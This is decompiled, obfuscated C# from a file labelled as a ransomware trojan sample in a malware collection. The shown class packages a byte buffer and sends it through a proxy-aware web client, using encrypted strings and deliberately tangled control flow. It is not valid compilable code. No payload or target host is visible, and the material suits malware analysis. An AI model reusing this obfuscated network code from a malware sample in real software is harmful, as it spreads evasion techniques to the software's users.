// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0003;
using \u0008;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0008
{
  internal class \u0004
  {
    private IWebProxy \u0001;
    private \u0001.\u0005 \u0001;
    [NonSerialized]
    internal static GetString \u0011;

    public void \u0001([In] IWebProxy obj0) => this.\u0001 = obj0;

    internal bool \u0001([In] byte[] obj0, [In] \u0004.\u0003 obj1)
    {
      byte[] numArray1;
      bool flag;
      try
      {
        numArray1 = \u0003.\u0001.\u0002(obj0);
      }
      catch (Exception ex)
      {
        this.\u0001(\u0003.\u0003.\u0001, \u0003.\u0001.\u0001);
        flag = false;
        goto label_9;
      }
      if (true)
        goto label_11;
label_6:
      \u0004 obj2 = new \u0004(\u0004.\u0011(1212));
      if (this.\u0001 != null)
      {
        obj2.\u0001(this.\u0001);
        goto label_8;
      }
      else
        goto label_8;
label_11:
      byte[] numArray2 = \u0005.\u0003.\u0001(numArray1, \u0004.\u0011(886));
      byte[] numArray3;
      if (true)
        numArray3 = numArray2;
      if (numArray3 != null)
      {
        this.\u0001(\u0003.\u0003.\u0002);
        goto label_6;
      }
      else
      {
        this.\u0001(\u0003.\u0003.\u0001, \u0005.\u0003.\u0001);
        int num = 0;
        return num != 0 ? num != 0 : num != 0;
      }
label_8:
      \u0004.\u0001 obj3 = new \u0004.\u0001(this, numArray3, obj2, obj1);
      obj2.\u0001(new \u0002.\u0005(obj3.\u0001));
      return obj3.\u0001;
label_9:
      if (true)
        return flag;
      goto label_8;
    }

    [SpecialName]
    public void \u0001([In] \u0001.\u0005 obj0)
    {
      \u0001.\u0005 obj1 = this.\u0001;
label_4:
      \u0001.\u0005 comparand = obj1;
      do
      {
        \u0001.\u0005 obj2 = (\u0001.\u0005) \u0090.\u008E\u0002((Delegate) comparand, (Delegate) obj0);
        \u0001.\u0005 obj3;
        if (true)
          obj3 = obj2;
        obj1 = Interlocked.CompareExchange<\u0001.\u0005>(ref this.\u0001, obj3, comparand);
        if (obj1 != comparand)
          goto label_4;
      }
      while (false);
    }

    protected void \u0001([In] \u0003.\u0003 obj0, [In] string obj1, [In] string obj2)
    {
      \u0001.\u0005 obj3 = this.\u0001;
      \u0001.\u0005 obj4;
      if (true)
        obj4 = obj3;
      if (obj4 == null)
        return;
      obj4((object) this, new \u000F.\u0003(obj0, obj1, obj2));
    }

    protected void \u0001([In] \u0003.\u0003 obj0, [In] string obj1) => this.\u0001(obj0, obj1, string.Empty);

    protected void \u0001([In] \u0003.\u0003 obj0) => this.\u0001(obj0, string.Empty);

    static \u0004() => Strings.CreateGetStringDelegate(typeof (\u0004));

    private sealed class \u0001
    {
      private readonly \u0004 \u0001;
      private readonly byte[] \u0001;
      private readonly \u0004 \u0001;
      private readonly \u0004.\u0003 \u0001;
      public bool \u0001 = true;
      [NonSerialized]
      internal static GetString \u0098;

      public \u0001([In] \u0004 obj0, [In] byte[] obj1, [In] \u0004 obj2, [In] \u0004.\u0003 obj3)
      {
        this.\u0001 = obj0;
        this.\u0001 = obj3;
        this.\u0001 = obj2;
        this.\u0001 = obj1;
      }

      public void \u0001([In] string obj0)
      {
label_0:
        int num = \u0006.\u000E(obj0, \u0004.\u0001.\u0098(1267)) ? 1 : 0;
        if (true)
        {
          if (num == 0)
          {
            string str = obj0;
            if (this.\u0001.\u0001 != null)
              this.\u0001.\u0001((object) this, new \u000F.\u0003(\u0003.\u0003.\u0002, str));
            if (true)
            {
              if (true)
              {
                this.\u0001 = false;
                return;
              }
              goto label_2;
            }
          }
          this.\u0001.\u0001(\u0003.\u0003.\u0003);
        }
        else
          goto label_3;
label_2:
        byte[] numArray1 = \u0091.\u007E\u008F\u0002((object) \u001F.\u0007\u0002(), \u0004.\u0001.\u0098(1272));
        num = numArray1.Length;
label_3:
        byte[] numArray2 = new byte[num + this.\u0001.Length];
        \u0092.\u0090\u0002((Array) numArray1, (Array) numArray2, numArray1.Length);
        \u0089.\u001B\u0002((Array) this.\u0001, 0, (Array) numArray2, numArray1.Length, this.\u0001.Length);
        if (true)
        {
          if (true)
          {
            \u0004.\u0002 obj = new \u0004.\u0002(this.\u0001);
            this.\u0001.\u0001(numArray2, this.\u0001.\u0003(), this.\u0001.\u0002(), this.\u0001.\u0001(), new \u0002.\u0005(obj.\u0001));
            this.\u0001 = obj.\u0001;
          }
          else
            goto label_2;
        }
        else
          goto label_0;
      }

      static \u0001() => Strings.CreateGetStringDelegate(typeof (\u0004.\u0001));
    }

    private sealed class \u0002
    {
      private readonly \u0004 \u0001;
      public bool \u0001;
      [NonSerialized]
      internal static GetString \u001E;

      public \u0002([In] \u0004 obj0) => this.\u0001 = obj0;

      public void \u0001([In] string obj0)
      {
        if (\u0087.\u007E\u0015\u0002((object) obj0, \u0004.\u0002.\u001E(1328)))
        {
          this.\u0001.\u0001(\u0003.\u0003.\u0003, obj0);
          this.\u0001 = false;
        }
        else
        {
          this.\u0001.\u0001(\u0003.\u0003.\u0004, string.Empty, obj0);
          this.\u0001 = true;
        }
      }

      static \u0002() => Strings.CreateGetStringDelegate(typeof (\u0004.\u0002));
    }

    internal sealed class \u0003
    {
      public static \u0004.\u0003 \u0001 = new \u0004.\u0003((string) null, (string) null, (string) null);
      private readonly string \u0001;
      private readonly string \u0002;
      private readonly string \u0003;

      public \u0003([In] string obj0, [In] string obj1, [In] string obj2)
      {
        this.\u0001 = obj0;
        this.\u0003 = obj2;
        this.\u0002 = obj1;
      }

      [SpecialName]
      public string \u0001() => this.\u0003;

      [SpecialName]
      public string \u0002() => this.\u0002;

      [SpecialName]
      public string \u0003() => this.\u0001;
    }
  }
}
